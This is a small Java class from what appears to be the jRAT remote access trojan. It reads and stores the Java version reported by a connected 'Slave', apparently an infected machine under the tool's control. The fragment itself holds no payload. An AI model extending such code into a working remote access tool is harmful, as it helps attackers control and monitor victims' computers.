package io.jrat.client.packets.incoming;

import io.jrat.client.Slave;

import java.io.DataInputStream;


public class Packet25InitJavaVersion extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String version = slave.readLine();
		slave.setJavaVersion(version);
	}
}
